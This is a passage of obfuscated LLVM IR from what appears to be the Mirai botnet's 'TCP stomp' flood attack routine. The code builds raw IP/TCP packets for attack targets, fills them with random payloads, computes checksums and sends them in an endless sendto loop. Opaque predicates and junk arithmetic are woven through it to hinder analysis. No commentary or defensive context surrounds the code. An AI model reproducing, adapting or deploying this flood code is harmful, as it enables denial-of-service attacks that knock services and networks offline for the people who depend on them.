  %533 = load i8, i8* %19, align 1
  %534 = sext i8 %533 to i16
  %535 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %536 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %535, i32 0, i32 4
  %537 = load i16, i16* %536, align 4
  %538 = and i16 %534, 1
  %539 = shl i16 %538, 12
  %540 = and i16 %537, -4097
  %541 = or i16 %540, %539
  store i16 %541, i16* %536, align 4
  %542 = load i8, i8* %20, align 1
  %543 = sext i8 %542 to i16
  %544 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %545 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %544, i32 0, i32 4
  %546 = load i16, i16* %545, align 4
  %547 = and i16 %543, 1
  %548 = shl i16 %547, 11
  %549 = and i16 %546, -2049
  %550 = or i16 %549, %548
  store i16 %550, i16* %545, align 4
  %551 = load i8, i8* %21, align 1
  %552 = sext i8 %551 to i16
  %553 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %554 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %553, i32 0, i32 4
  %555 = load i16, i16* %554, align 4
  %556 = and i16 %552, 1
  %557 = shl i16 %556, 10
  %558 = and i16 %555, -1025
  %559 = or i16 %558, %557
  store i16 %559, i16* %554, align 4
  %560 = load i8, i8* %22, align 1
  %561 = sext i8 %560 to i16
  %562 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %563 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %562, i32 0, i32 4
  %564 = load i16, i16* %563, align 4
  %565 = and i16 %561, 1
  %566 = shl i16 %565, 9
  %567 = and i16 %564, -513
  %568 = or i16 %567, %566
  store i16 %568, i16* %563, align 4
  %569 = load i8, i8* %23, align 1
  %570 = sext i8 %569 to i16
  %571 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %572 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %571, i32 0, i32 4
  %573 = load i16, i16* %572, align 4
  %574 = and i16 %570, 1
  %575 = shl i16 %574, 8
  %576 = and i16 %573, -257
  %577 = or i16 %576, %575
  store i16 %577, i16* %572, align 4
  %578 = load i8*, i8** %38, align 8
  %579 = load i32, i32* %24, align 4
  call void @rand_str(i8* %578, i32 %579)
  %580 = load i32, i32* @x.29
  %581 = load i32, i32* @y.30
  %582 = sub i32 %580, 1
  %583 = mul i32 %580, %582
  %584 = urem i32 %583, 2
  %585 = icmp eq i32 %584, 0
  %586 = icmp slt i32 %581, 10
  %587 = or i1 %585, %586
  br i1 %587, label %originalBBpart2239, label %originalBB26alteredBB

originalBBpart2239:                               ; preds = %originalBB26
  br label %715

; <label>:588:                                    ; preds = %331, %323
  %589 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %590 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %589, i32 0, i32 4
  %591 = load i16, i16* %590, align 4
  %592 = lshr i16 %591, 8
  %593 = and i16 %592, 1
  %594 = zext i16 %593 to i32
  %595 = icmp ne i32 %594, 0
  br i1 %595, label %620, label %596

; <label>:596:                                    ; preds = %588
  %597 = load i32, i32* @x.29
  %598 = load i32, i32* @y.30
  %599 = sub i32 %597, 1
  %600 = mul i32 %597, %599
  %601 = urem i32 %600, 2
  %602 = icmp eq i32 %601, 0
  %603 = icmp slt i32 %598, 10
  %604 = or i1 %602, %603
  br i1 %604, label %originalBB241, label %originalBB241alteredBB

originalBB241:                                    ; preds = %originalBB241alteredBB, %596
  %605 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %606 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %605, i32 0, i32 4
  %607 = load i16, i16* %606, align 4
  %608 = lshr i16 %607, 10
  %609 = and i16 %608, 1
  %610 = zext i16 %609 to i32
  %611 = icmp ne i32 %610, 0
  %612 = load i32, i32* @x.29
  %613 = load i32, i32* @y.30
  %614 = sub i32 %612, 1
  %615 = mul i32 %612, %614
  %616 = urem i32 %615, 2
  %617 = icmp eq i32 %616, 0
  %618 = icmp slt i32 %613, 10
  %619 = or i1 %617, %618
  br i1 %619, label %originalBBpart2251, label %originalBB241alteredBB

originalBBpart2251:                               ; preds = %originalBB241
  br i1 %611, label %620, label %623

; <label>:620:                                    ; preds = %originalBBpart2251, %588
  %621 = load i32, i32* %26, align 4
  %622 = call i32 @close(i32 %621)
  br label %137

; <label>:623:                                    ; preds = %originalBBpart2251
  %624 = load i32, i32* @x.29
  %625 = load i32, i32* @y.30
  %626 = sub i32 %624, 1
  %627 = mul i32 %624, %626
  %628 = urem i32 %627, 2
  %629 = icmp eq i32 %628, 0
  %630 = icmp slt i32 %625, 10
  %631 = or i1 %629, %630
  br i1 %631, label %originalBB253, label %originalBB253alteredBB

originalBB253:                                    ; preds = %originalBB253alteredBB, %623
  %632 = load i32, i32* @x.29
  %633 = load i32, i32* @y.30
  %634 = sub i32 %632, 1
  %635 = mul i32 %632, %634
  %636 = urem i32 %635, 2
  %637 = icmp eq i32 %636, 0
  %638 = icmp slt i32 %633, 10
  %639 = or i1 %637, %638
  br i1 %639, label %originalBBpart2255, label %originalBB253alteredBB

originalBBpart2255:                               ; preds = %originalBB253
  br label %640

; <label>:640:                                    ; preds = %originalBBpart2255
  %641 = load i32, i32* @x.29
  %642 = load i32, i32* @y.30
  %643 = sub i32 %641, 1
  %644 = mul i32 %641, %643
  %645 = urem i32 %644, 2
  %646 = icmp eq i32 %645, 0
  %647 = icmp slt i32 %642, 10
  %648 = or i1 %646, %647
  br i1 %648, label %originalBB257, label %originalBB257alteredBB

originalBB257:                                    ; preds = %originalBB257alteredBB, %640
  %649 = load i32, i32* @x.29
  %650 = load i32, i32* @y.30
  %651 = sub i32 %649, 1
  %652 = mul i32 %649, %651
  %653 = urem i32 %652, 2
  %654 = icmp eq i32 %653, 0
  %655 = icmp slt i32 %650, 10
  %656 = or i1 %654, %655
  br i1 %656, label %originalBBpart2259, label %originalBB257alteredBB

originalBBpart2259:                               ; preds = %originalBB257
  br label %657

; <label>:657:                                    ; preds = %originalBBpart2259, %originalBBpart220
  %658 = load i32, i32* @x.29
  %659 = load i32, i32* @y.30
  %660 = sub i32 %658, 1
  %661 = mul i32 %658, %660
  %662 = urem i32 %661, 2
  %663 = icmp eq i32 %662, 0
  %664 = icmp slt i32 %659, 10
  %665 = or i1 %663, %664
  br i1 %665, label %originalBB261, label %originalBB261alteredBB

originalBB261:                                    ; preds = %originalBB261alteredBB, %657
  %666 = load i32, i32* @x.29
  %667 = load i32, i32* @y.30
  %668 = sub i32 %666, 1
  %669 = mul i32 %666, %668
  %670 = urem i32 %669, 2
  %671 = icmp eq i32 %670, 0
  %672 = icmp slt i32 %667, 10
  %673 = or i1 %671, %672
  br i1 %673, label %originalBBpart2263, label %originalBB261alteredBB

originalBBpart2263:                               ; preds = %originalBB261
  br label %674

; <label>:674:                                    ; preds = %originalBBpart2263, %originalBBpart216, %originalBBpart212
  %675 = load i32, i32* @x.29
  %676 = load i32, i32* @y.30
  %677 = sub i32 %675, 1
  %678 = mul i32 %675, %677
  %679 = urem i32 %678, 2
  %680 = icmp eq i32 %679, 0
  %681 = icmp slt i32 %676, 10
  %682 = or i1 %680, %681
  br i1 %682, label %originalBB265, label %originalBB265alteredBB

originalBB265:                                    ; preds = %originalBB265alteredBB, %674
  %683 = call i64 @time(i64* null) #6
  %684 = load i64, i64* %31, align 8
  %685 = sub nsw i64 %683, %684
  %686 = icmp sgt i64 %685, 10
  %687 = load i32, i32* @x.29
  %688 = load i32, i32* @y.30
  %689 = sub i32 %687, 1
  %690 = mul i32 %687, %689
  %691 = urem i32 %690, 2
  %692 = icmp eq i32 %691, 0
  %693 = icmp slt i32 %688, 10
  %694 = or i1 %692, %693
  br i1 %694, label %originalBBpart2275, label %originalBB265alteredBB

originalBBpart2275:                               ; preds = %originalBB265
  br i1 %686, label %695, label %714

; <label>:695:                                    ; preds = %originalBBpart2275
  %696 = load i32, i32* @x.29
  %697 = load i32, i32* @y.30
  %698 = sub i32 %696, 1
  %699 = mul i32 %696, %698
  %700 = urem i32 %699, 2
  %701 = icmp eq i32 %700, 0
  %702 = icmp slt i32 %697, 10
  %703 = or i1 %701, %702
  br i1 %703, label %originalBB277, label %originalBB277alteredBB

originalBB277:                                    ; preds = %originalBB277alteredBB, %695
  %704 = load i32, i32* %26, align 4
  %705 = call i32 @close(i32 %704)
  %706 = load i32, i32* @x.29
  %707 = load i32, i32* @y.30
  %708 = sub i32 %706, 1
  %709 = mul i32 %706, %708
  %710 = urem i32 %709, 2
  %711 = icmp eq i32 %710, 0
  %712 = icmp slt i32 %707, 10
  %713 = or i1 %711, %712
  br i1 %713, label %originalBBpart2279, label %originalBB277alteredBB

originalBBpart2279:                               ; preds = %originalBB277
  br label %137

; <label>:714:                                    ; preds = %originalBBpart2275
  br label %239

; <label>:715:                                    ; preds = %originalBBpart2239
  br label %716

; <label>:716:                                    ; preds = %715, %140
  %717 = load i32, i32* @x.29
  %718 = load i32, i32* @y.30
  %719 = sub i32 %717, 1
  %720 = mul i32 %717, %719
  %721 = urem i32 %720, 2
  %722 = icmp eq i32 %721, 0
  %723 = icmp slt i32 %718, 10
  %724 = or i1 %722, %723
  br i1 %724, label %originalBB281, label %originalBB281alteredBB

originalBB281:                                    ; preds = %originalBB281alteredBB, %716
  %725 = load i32, i32* %9, align 4
  %726 = add nsw i32 %725, 1
  store i32 %726, i32* %9, align 4
  %727 = load i32, i32* @x.29
  %728 = load i32, i32* @y.30
  %729 = sub i32 %727, 1
  %730 = mul i32 %727, %729
  %731 = urem i32 %730, 2
  %732 = icmp eq i32 %731, 0
  %733 = icmp slt i32 %728, 10
  %734 = or i1 %732, %733
  br i1 %734, label %originalBBpart2292, label %originalBB281alteredBB

originalBBpart2292:                               ; preds = %originalBB281
  br label %131

; <label>:735:                                    ; preds = %131
  br label %736

; <label>:736:                                    ; preds = %910, %735
  store i32 0, i32* %9, align 4
  br label %737

; <label>:737:                                    ; preds = %907, %736
  %738 = load i32, i32* %9, align 4
  %739 = load i8, i8* %5, align 1
  %740 = zext i8 %739 to i32
  %741 = icmp slt i32 %738, %740
  br i1 %741, label %742, label %910

; <label>:742:                                    ; preds = %737
  %743 = load i32, i32* @x.29
  %744 = load i32, i32* @y.30
  %745 = sub i32 %743, 1
  %746 = mul i32 %743, %745
  %747 = urem i32 %746, 2
  %748 = icmp eq i32 %747, 0
  %749 = icmp slt i32 %744, 10
  %750 = or i1 %748, %749
  br i1 %750, label %originalBB294, label %originalBB294alteredBB

originalBB294:                                    ; preds = %originalBB294alteredBB, %742
  %751 = load i8**, i8*** %12, align 8
  %752 = load i32, i32* %9, align 4
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds i8*, i8** %751, i64 %753
  %755 = load i8*, i8** %754, align 8
  store i8* %755, i8** %39, align 8
  %756 = load i8*, i8** %39, align 8
  %757 = bitcast i8* %756 to %struct.iphdr*
  store %struct.iphdr* %757, %struct.iphdr** %40, align 8
  %758 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %759 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %758, i64 1
  %760 = bitcast %struct.iphdr* %759 to %struct.tcphdr*
  store %struct.tcphdr* %760, %struct.tcphdr** %41, align 8
  %761 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %762 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %761, i64 1
  %763 = bitcast %struct.tcphdr* %762 to i8*
  store i8* %763, i8** %42, align 8
  %764 = load i16, i16* %14, align 2
  %765 = zext i16 %764 to i32
  %766 = icmp eq i32 %765, 65535
  %767 = load i32, i32* @x.29
  %768 = load i32, i32* @y.30
  %769 = sub i32 %767, 1
  %770 = mul i32 %767, %769
  %771 = urem i32 %770, 2
  %772 = icmp eq i32 %771, 0
  %773 = icmp slt i32 %768, 10
  %774 = or i1 %772, %773
  br i1 %774, label %originalBBpart2296, label %originalBB294alteredBB

originalBBpart2296:                               ; preds = %originalBB294
  br i1 %766, label %775, label %781

; <label>:775:                                    ; preds = %originalBBpart2296
  %776 = call i32 @rand_next()
  %777 = and i32 %776, 65535
  %778 = trunc i32 %777 to i16
  %779 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %780 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %779, i32 0, i32 3
  store i16 %778, i16* %780, align 4
  br label %781

; <label>:781:                                    ; preds = %775, %originalBBpart2296
  %782 = load i32, i32* @x.29
  %783 = load i32, i32* @y.30
  %784 = sub i32 %782, 1
  %785 = mul i32 %782, %784
  %786 = urem i32 %785, 2
  %787 = icmp eq i32 %786, 0
  %788 = icmp slt i32 %783, 10
  %789 = or i1 %787, %788
  br i1 %789, label %originalBB298, label %originalBB298alteredBB

originalBB298:                                    ; preds = %originalBB298alteredBB, %781
  %790 = load i8, i8* %25, align 1
  %791 = icmp ne i8 %790, 0
  %792 = load i32, i32* @x.29
  %793 = load i32, i32* @y.30
  %794 = sub i32 %792, 1
  %795 = mul i32 %792, %794
  %796 = urem i32 %795, 2
  %797 = icmp eq i32 %796, 0
  %798 = icmp slt i32 %793, 10
  %799 = or i1 %797, %798
  br i1 %799, label %originalBBpart2300, label %originalBB298alteredBB

originalBBpart2300:                               ; preds = %originalBB298
  br i1 %791, label %800, label %819

; <label>:800:                                    ; preds = %originalBBpart2300
  %801 = load i32, i32* @x.29
  %802 = load i32, i32* @y.30
  %803 = sub i32 %801, 1
  %804 = mul i32 %801, %803
  %805 = urem i32 %804, 2
  %806 = icmp eq i32 %805, 0
  %807 = icmp slt i32 %802, 10
  %808 = or i1 %806, %807
  br i1 %808, label %originalBB302, label %originalBB302alteredBB

originalBB302:                                    ; preds = %originalBB302alteredBB, %800
  %809 = load i8*, i8** %42, align 8
  %810 = load i32, i32* %24, align 4
  call void @rand_str(i8* %809, i32 %810)
  %811 = load i32, i32* @x.29
  %812 = load i32, i32* @y.30
  %813 = sub i32 %811, 1
  %814 = mul i32 %811, %813
  %815 = urem i32 %814, 2
  %816 = icmp eq i32 %815, 0
  %817 = icmp slt i32 %812, 10
  %818 = or i1 %816, %817
  br i1 %818, label %originalBBpart2304, label %originalBB302alteredBB

originalBBpart2304:                               ; preds = %originalBB302
  br label %819

; <label>:819:                                    ; preds = %originalBBpart2304, %originalBBpart2300
  %820 = load i32, i32* @x.29
  %821 = load i32, i32* @y.30
  %822 = sub i32 %820, 1
  %823 = mul i32 %820, %822
  %824 = urem i32 %823, 2
  %825 = icmp eq i32 %824, 0
  %826 = icmp slt i32 %821, 10
  %827 = or i1 %825, %826
  br i1 %827, label %originalBB306, label %originalBB306alteredBB

originalBB306:                                    ; preds = %originalBB306alteredBB, %819
  %828 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %829 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %828, i32 0, i32 7
  store i16 0, i16* %829, align 2
  %830 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %831 = bitcast %struct.iphdr* %830 to i16*
  %832 = call zeroext i16 @checksum_generic(i16* %831, i32 20)
  %833 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %834 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %833, i32 0, i32 7
  store i16 %832, i16* %834, align 2
  %835 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %836 = load i32, i32* %9, align 4
  %837 = sext i32 %836 to i64
  %838 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %835, i64 %837
  %839 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %838, i32 0, i32 1
  %840 = load i32, i32* %839, align 4
  %841 = add i32 %840, 1
  store i32 %841, i32* %839, align 4
  %842 = trunc i32 %840 to i16
  %843 = call zeroext i16 @htons(i16 zeroext %842) #7
  %844 = zext i16 %843 to i32
  %845 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %846 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %845, i32 0, i32 2
  store i32 %844, i32* %846, align 4
  %847 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %848 = load i32, i32* %9, align 4
  %849 = sext i32 %848 to i64
  %850 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %847, i64 %849
  %851 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %850, i32 0, i32 2
  %852 = load i32, i32* %851, align 4
  %853 = trunc i32 %852 to i16
  %854 = call zeroext i16 @htons(i16 zeroext %853) #7
  %855 = zext i16 %854 to i32
  %856 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %857 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %856, i32 0, i32 3
  store i32 %855, i32* %857, align 4
  %858 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %859 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %858, i32 0, i32 6
  store i16 0, i16* %859, align 4
  %860 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %861 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %862 = bitcast %struct.tcphdr* %861 to i8*
  %863 = load i32, i32* %24, align 4
  %864 = sext i32 %863 to i64
  %865 = add i64 20, %864
  %866 = trunc i64 %865 to i16
  %867 = call zeroext i16 @htons(i16 zeroext %866) #7
  %868 = load i32, i32* %24, align 4
  %869 = sext i32 %868 to i64
  %870 = add i64 20, %869
  %871 = trunc i64 %870 to i32
  %872 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %860, i8* %862, i16 zeroext %867, i32 %871)
  %873 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %874 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %873, i32 0, i32 6
  store i16 %872, i16* %874, align 4
  %875 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %876 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %875, i32 0, i32 1
  %877 = load i16, i16* %876, align 2
  %878 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %879 = load i32, i32* %9, align 4
  %880 = sext i32 %879 to i64
  %881 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %878, i64 %880
  %882 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %881, i32 0, i32 0
  %883 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %882, i32 0, i32 1
  store i16 %877, i16* %883, align 2
  %884 = load i32, i32* %10, align 4
  %885 = load i8*, i8** %39, align 8
  %886 = load i32, i32* %24, align 4
  %887 = sext i32 %886 to i64
  %888 = add i64 40, %887
  %889 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %890 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %891 = load i32, i32* %9, align 4
  %892 = sext i32 %891 to i64
  %893 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %890, i64 %892
  %894 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %893, i32 0, i32 0
  %895 = bitcast %struct.sockaddr_in* %894 to %struct.sockaddr*
  store %struct.sockaddr* %895, %struct.sockaddr** %889, align 8
  %896 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %897 = load %struct.sockaddr*, %struct.sockaddr** %896, align 8
  %898 = call i64 @sendto(i32 %884, i8* %885, i64 %888, i32 16384, %struct.sockaddr* %897, i32 16)
  %899 = load i32, i32* @x.29
  %900 = load i32, i32* @y.30
  %901 = sub i32 %899, 1
  %902 = mul i32 %899, %901
  %903 = urem i32 %902, 2
  %904 = icmp eq i32 %903, 0
  %905 = icmp slt i32 %900, 10
  %906 = or i1 %904, %905
  br i1 %906, label %originalBBpart2346, label %originalBB306alteredBB

originalBBpart2346:                               ; preds = %originalBB306
  br label %907

; <label>:907:                                    ; preds = %originalBBpart2346
  %908 = load i32, i32* %9, align 4
  %909 = add nsw i32 %908, 1
  store i32 %909, i32* %9, align 4
  br label %737

; <label>:910:                                    ; preds = %737
  br label %736

; <label>:911:                                    ; preds = %250, %111, %105
  %912 = load i32, i32* @x.29
  %913 = load i32, i32* @y.30
  %914 = sub i32 %912, 1
  %915 = mul i32 %912, %914
  %916 = urem i32 %915, 2
  %917 = icmp eq i32 %916, 0
  %918 = icmp slt i32 %913, 10
  %919 = or i1 %917, %918
  br i1 %919, label %originalBB348, label %originalBB348alteredBB

originalBB348:                                    ; preds = %originalBB348alteredBB, %911
  %920 = load i32, i32* @x.29
  %921 = load i32, i32* @y.30
  %922 = sub i32 %920, 1
  %923 = mul i32 %920, %922
  %924 = urem i32 %923, 2
  %925 = icmp eq i32 %924, 0
  %926 = icmp slt i32 %921, 10
  %927 = or i1 %925, %926
  br i1 %927, label %originalBBpart2350, label %originalBB348alteredBB

originalBBpart2350:                               ; preds = %originalBB348
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %114
  store i32 0, i32* %9, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %141
  %928 = load i32, i32* %26, align 4
  %929 = load i32, i32* %26, align 4
  %930 = call i32 (i32, i32, ...) @fcntl(i32 %929, i32 3, i32 0)
  %931 = or i32 %930, 2048
  %932 = call i32 (i32, i32, ...) @fcntl(i32 %928, i32 4, i32 %931)
  %933 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %933, align 4
  %934 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %935 = load i32, i32* %9, align 4
  %936 = sext i32 %935 to i64
  %937 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %934, i64 %936
  %938 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %937, i32 0, i32 2
  %939 = load i8, i8* %938, align 4
  %940 = zext i8 %939 to i32
  %941 = icmp slt i32 %940, 32
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %211
  %942 = load i16, i16* %17, align 2
  %943 = call zeroext i16 @htons(i16 zeroext %942) #7
  %944 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %943, i16* %944, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %251
  %945 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %946 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %945, i32 0, i32 0
  %947 = load i32, i32* %946, align 4
  %948 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %949 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %948, i32 0, i32 0
  %950 = load i32, i32* %949, align 4
  %951 = icmp eq i32 %947, %950
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %275
  %952 = load i32, i32* %33, align 4
  %953 = sext i32 %952 to i64
  %954 = icmp ugt i64 %953, 40
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %295
  %955 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %956 = getelementptr inbounds i8, i8* %955, i64 20
  %957 = bitcast i8* %956 to %struct.tcphdr*
  store %struct.tcphdr* %957, %struct.tcphdr** %35, align 8
  %958 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %959 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %958, i32 0, i32 0
  %960 = load i16, i16* %959, align 4
  %961 = zext i16 %960 to i32
  %962 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %963 = load i16, i16* %962, align 2
  %964 = zext i16 %963 to i32
  %965 = icmp eq i32 %961, %964
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %430
  %966 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %967 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %968 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %967, i32 0, i32 4
  store i16 %966, i16* %968, align 2
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %450
  %969 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %970 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %969, i32 0, i32 6
  store i8 6, i8* %970, align 1
  %971 = load i32, i32* @LOCAL_ADDR, align 4
  %972 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %973 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %972, i32 0, i32 8
  store i32 %971, i32* %973, align 4
  %974 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %975 = load i32, i32* %9, align 4
  %976 = sext i32 %975 to i64
  %977 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %974, i64 %976
  %978 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %977, i32 0, i32 0
  %979 = load i32, i32* %978, align 4
  %980 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %981 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %980, i32 0, i32 9
  store i32 %979, i32* %981, align 4
  %982 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %983 = load i32, i32* %9, align 4
  %984 = sext i32 %983 to i64
  %985 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %982, i64 %984
  %986 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %985, i32 0, i32 3
  %987 = load i16, i16* %986, align 4
  %988 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %989 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %988, i32 0, i32 0
  store i16 %987, i16* %989, align 4
  %990 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %991 = load i32, i32* %9, align 4
  %992 = sext i32 %991 to i64
  %993 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %990, i64 %992
  %994 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %993, i32 0, i32 4
  %995 = load i16, i16* %994, align 2
  %996 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %997 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %996, i32 0, i32 1
  store i16 %995, i16* %997, align 2
  %998 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %999 = load i32, i32* %9, align 4
  %1000 = sext i32 %999 to i64
  %1001 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %998, i64 %1000
  %1002 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1001, i32 0, i32 2
  %1003 = load i32, i32* %1002, align 4
  %1004 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1005 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1004, i32 0, i32 2
  store i32 %1003, i32* %1005, align 4
  %1006 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %1007 = load i32, i32* %9, align 4
  %1008 = sext i32 %1007 to i64
  %1009 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1006, i64 %1008
  %1010 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1009, i32 0, i32 1
  %1011 = load i32, i32* %1010, align 4
  %1012 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1013 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1012, i32 0, i32 3
  store i32 %1011, i32* %1013, align 4
  %1014 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1015 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1014, i32 0, i32 4
  %1016 = load i16, i16* %1015, align 4
  %_ = sub i16 %1016, -241
  %gen = mul i16 %_, -241
  %1017 = and i16 %1016, -241
  %_27 = sub i16 0, %1017
  %gen28 = add i16 %_27, 128
  %_29 = sub i16 %1017, 128
  %gen30 = mul i16 %_29, 128
  %_31 = shl i16 %1017, 128
  %_32 = sub i16 0, %1017
  %gen33 = add i16 %_32, 128
  %_34 = sub i16 %1017, 128
  %gen35 = mul i16 %_34, 128
  %_36 = sub i16 %1017, 128
  %gen37 = mul i16 %_36, 128
  %_38 = shl i16 %1017, 128
  %_39 = sub i16 0, %1017
  %gen40 = add i16 %_39, 128
  %1018 = or i16 %1017, 128
  store i16 %1018, i16* %1015, align 4
  %1019 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1020 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1019, i32 0, i32 4
  %1021 = load i16, i16* %1020, align 4
  %_41 = shl i16 %1021, -257
  %_42 = sub i16 %1021, -257
  %gen43 = mul i16 %_42, -257
  %_44 = sub i16 0, %1021
  %gen45 = add i16 %_44, -257
  %_46 = shl i16 %1021, -257
  %_47 = sub i16 %1021, -257
  %gen48 = mul i16 %_47, -257
  %1022 = and i16 %1021, -257
  %_49 = sub i16 0, %1022
  %gen50 = add i16 %_49, 256
  %1023 = or i16 %1022, 256
  store i16 %1023, i16* %1020, align 4
  %1024 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1025 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1024, i32 0, i32 4
  %1026 = load i16, i16* %1025, align 4
  %_51 = sub i16 0, %1026
  %gen52 = add i16 %_51, -4097
  %_53 = sub i16 %1026, -4097
  %gen54 = mul i16 %_53, -4097
  %1027 = and i16 %1026, -4097
  %1028 = or i16 %1027, 4096
  store i16 %1028, i16* %1025, align 4
  %1029 = call i32 @rand_next()
  %_55 = sub i32 0, %1029
  %gen56 = add i32 %_55, 65535
  %_57 = sub i32 %1029, 65535
  %gen58 = mul i32 %_57, 65535
  %_59 = sub i32 0, %1029
  %gen60 = add i32 %_59, 65535
